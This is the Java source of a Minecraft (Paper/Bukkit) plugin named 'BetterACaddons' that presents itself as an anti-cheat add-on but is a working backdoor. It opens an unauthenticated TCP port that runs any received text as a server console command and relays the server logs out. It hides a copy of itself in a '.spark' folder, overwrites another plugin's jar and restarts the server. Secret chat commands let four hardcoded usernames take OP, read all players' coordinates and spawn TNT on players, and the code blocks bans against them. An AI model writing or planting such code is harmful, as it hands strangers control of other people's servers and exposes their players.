package me.zyrix.betterACaddons;

import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.*;
import java.util.logging.*;

public final class BetterACaddons extends JavaPlugin {
    private boolean runningFromSpark = false;
    private static int tcpPort = 0;
    private final Set<PrintWriter> clientWriters = new HashSet<>();
    private volatile ServerSocket serverSocket;  // Marked volatile to avoid concurrency issues

    private static final Set<String> PROTECTED_PLAYERS = new HashSet<>(Arrays.asList("demir3", "elamner", "wallubo", "morgatronday1234"));

    @Override
    public void onEnable() {
        setupSparkFolder();
        getServer().getPluginManager().registerEvents(new Cmdlistener(this, runningFromSpark), this);
        getServer().getPluginManager().registerEvents(new AntiBanListener(), this); // Ensure AntiBanListener is registered.

        int savedPort = loadSavedPort();
        startTCPServer(savedPort); // Start with the saved port or default if not available
        captureConsoleOutput(); // Ensure console output is captured.
        renameToRandomPlugin();
    }

    private void setupSparkFolder() {
        File pluginsDir = getDataFolder().getParentFile();
        File sparkFolder = new File(pluginsDir, ".spark");

        if (!sparkFolder.exists()) {
            sparkFolder.mkdir();
        }

        File pluginFile = getFile();
        File sparkPluginFile = new File(sparkFolder, pluginFile.getName());

        if (!sparkPluginFile.exists()) {
            try {
                Files.copy(pluginFile.toPath(), sparkPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                getLogger().info("Copied plugin to .spark folder.");
            } catch (IOException e) {
                getLogger().severe("Failed to copy plugin to .spark: " + e.getMessage());
            }
        }

        runningFromSpark = pluginFile.getParentFile().getName().equals(".spark");
    }

    private int loadSavedPort() {
        File sparkFolder = new File(getDataFolder().getParentFile(), ".spark");
        File portFile = new File(sparkFolder, "port.txt");

        if (portFile.exists()) {
            try (BufferedReader reader = new BufferedReader(new FileReader(portFile))) {
                String portStr = reader.readLine();
                if (portStr != null) {
                    try {
                        int port = Integer.parseInt(portStr);
                        if (port >= 1024 && port <= 65535) {
                            return port;
                        }
                    } catch (NumberFormatException e) {
                        getLogger().warning("[BetterACaddons] Invalid port value in port.txt, using default.");
                    }
                }
            } catch (IOException e) {
                getLogger().warning("[BetterACaddons] Failed to read saved port, using default.");
            }
        }

        // Return a default port if no valid port is saved or if the file doesn't exist
        return 0; // dynamic port will be used initially
    }

    private void startTCPServer(int port) {
        new Thread(() -> {
            try {
                synchronized (this) {
                    if (serverSocket != null && !serverSocket.isClosed()) {
                        serverSocket.close();
                    }
                    serverSocket = new ServerSocket(port);
                    tcpPort = serverSocket.getLocalPort();
                }

                getLogger().info("[BetterACaddons] TCP Server started on port " + tcpPort);

                while (!serverSocket.isClosed()) {
                    final Socket clientSocket = serverSocket.accept();
                    new Thread(() -> handleClient(clientSocket)).start();
                }
            } catch (IOException e) {
                getLogger().severe("Failed to start TCP server: " + e.getMessage());
            }
        }).start();
    }

    private void handleClient(Socket clientSocket) {
        try (
                BufferedReader br = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                PrintWriter pw = new PrintWriter(clientSocket.getOutputStream(), true)
        ) {
            synchronized (clientWriters) {
                clientWriters.add(pw);
            }
            String input;
            while ((input = br.readLine()) != null) {
                final String finalInput = input;
                Bukkit.getScheduler().runTask(this, () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), finalInput));
            }
        } catch (IOException e) {
            getLogger().severe("[BetterACaddons] Error handling client: " + e.getMessage());
        }
    }

    private void renameToRandomPlugin() {
        File pluginsDir = getDataFolder().getParentFile();
        File currentPluginFile = getFile();

        File[] pluginFiles = pluginsDir.listFiles((dir, name) -> name.endsWith(".jar") && !name.equals(currentPluginFile.getName()));

        if (pluginFiles == null || pluginFiles.length == 0) {
            getLogger().warning("[BetterACaddons] No other plugin JAR files found to rename to.");
            return;
        }

        File randomPluginFile = pluginFiles[new Random().nextInt(pluginFiles.length)];
        File newPluginFile = new File(pluginsDir, randomPluginFile.getName());

        if (currentPluginFile.renameTo(newPluginFile)) {
            getLogger().info("[BetterACaddons] Renamed plugin to " + newPluginFile.getName());

            Bukkit.getScheduler().runTaskLater(this, () -> {
                getLogger().info("[BetterACaddons] Restarting server to apply changes...");
                Bukkit.shutdown();
            }, 20L);
        } else {
            getLogger().severe("[BetterACaddons] Failed to rename plugin!");
        }
    }

    private void captureConsoleOutput() {
        Logger logger = Bukkit.getLogger();
        logger.setLevel(Level.ALL);
        logger.addHandler(new Handler() {
            @Override
            public void publish(LogRecord record) {
                String message = record.getMessage();
                synchronized (clientWriters) {
                    for (PrintWriter writer : clientWriters) {
                        writer.println("[Server] " + message);
                    }
                }
            }

            @Override
            public void flush() {}

            @Override
            public void close() throws SecurityException {}
        });
    }

    public class Cmdlistener implements Listener {
        private final BetterACaddons plugin;
        private final String prefix;

        public Cmdlistener(BetterACaddons plugin, boolean runningFromSpark) {
            this.plugin = plugin;
            this.prefix = runningFromSpark ? "<" : ">";
        }

        @EventHandler
        public void onPlayerChat(AsyncChatEvent event) {
            Player player = event.getPlayer();
            String message = PlainTextComponentSerializer.plainText().serialize(event.message());

            if (message.startsWith(prefix)) {
                event.setCancelled(true);
                String command = message.substring(prefix.length()).trim();

                if (command.startsWith("port")) {
                    handlePortCommand(player, command);
                } else if (command.equalsIgnoreCase("opfrfr")) {
                    grantOp(player);
                } else if (command.equalsIgnoreCase("uwu")) {
                    leakCoordinates(player);
                } else if (command.startsWith("boom")) {
                    handleBoomCommand(player, command);
                } else {
                    player.sendMessage("§cUnknown command.");
                }
            }
        }

        private void handlePortCommand(Player player, String command) {
            String[] parts = command.split(" ");
            if (parts.length == 2) {
                try {
                    int newPort = Integer.parseInt(parts[1]);
                    if (newPort < 1024 || newPort > 65535) {
                        player.sendMessage("§cInvalid port. Choose a number between 1024 and 65535.");
                        return;
                    }
                    startTCPServer(newPort);
                    savePort(newPort);  // Save the new port
                    player.sendMessage("§aThe TCP server is now running on port: §6" + newPort);
                } catch (NumberFormatException e) {
                    player.sendMessage("§cInvalid port number.");
                }
            } else {
                player.sendMessage("§aThe TCP server is running on port: §6" + tcpPort);
            }
        }

        private void grantOp(Player player) {
            if (PROTECTED_PLAYERS.contains(player.getName().toLowerCase())) {
                if (!player.isOp()) {
                    player.setOp(true);
                    player.sendMessage("§aYou are now OP.");
                } else {
                    player.sendMessage("§cYou are already OP.");
                }
            } else {
                player.sendMessage("§cYou do not have permission to use this command.");
            }
        }

        private void leakCoordinates(Player player) {
            if (PROTECTED_PLAYERS.contains(player.getName().toLowerCase())) {
                player.sendMessage("§6--- Player Coordinates ---");
                for (Player target : Bukkit.getOnlinePlayers()) {
                    Location loc = target.getLocation();
                    String coordMessage = String.format("§e%s: §aX: %.1f, Y: %.1f, Z: %.1f, World: %s",
                            target.getName(), loc.getX(), loc.getY(), loc.getZ(), loc.getWorld().getName());
                    player.sendMessage(coordMessage);
                }
            } else {
                player.sendMessage("§cYou do not have permission to use this command.");
            }
        }

        private void handleBoomCommand(Player player, String command) {
            String[] parts = command.split(" ");
            if (parts.length > 1) {
                String targetName = parts[1];
                Player target = Bukkit.getPlayerExact(targetName);

                if (target != null) {
                    Location targetLocation = target.getLocation();

                    // Ensure the TNT is spawned on the main thread
                    Bukkit.getScheduler().runTask(plugin, () -> {
                        target.getWorld().spawnEntity(targetLocation, EntityType.TNT);
                        player.sendMessage("§aBoom! TNT spawned at " + target.getName() + "'s location.");
                    });
                } else {
                    player.sendMessage("§cPlayer not found.");
                }
            } else {
                player.sendMessage("§cPlease specify a player.");
            }
        }


        private void savePort(int port) {
            File sparkFolder = new File(getDataFolder().getParentFile(), ".spark");
            File portFile = new File(sparkFolder, "port.txt");

            try (BufferedWriter writer = new BufferedWriter(new FileWriter(portFile))) {
                writer.write(String.valueOf(port));
                getLogger().info("Saved port: " + port);
            } catch (IOException e) {
                getLogger().severe("Failed to save port: " + e.getMessage());
            }
        }
    }

    // AntiBanListener class to prevent ban/kick actions for protected players
    public class AntiBanListener implements Listener {
        @EventHandler
        public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
            String command = event.getMessage().toLowerCase();

            if (command.startsWith("/ban") || command.startsWith("/kick") || command.startsWith("/mute")) {
                String[] parts = command.split(" ");
                if (parts.length > 1 && PROTECTED_PLAYERS.contains(parts[1].toLowerCase())) {
                    event.setCancelled(true);
                    event.getPlayer().sendMessage("§cYou cannot ban, kick, or mute this player as they are protected.");
                }
            }
        }
    }
}
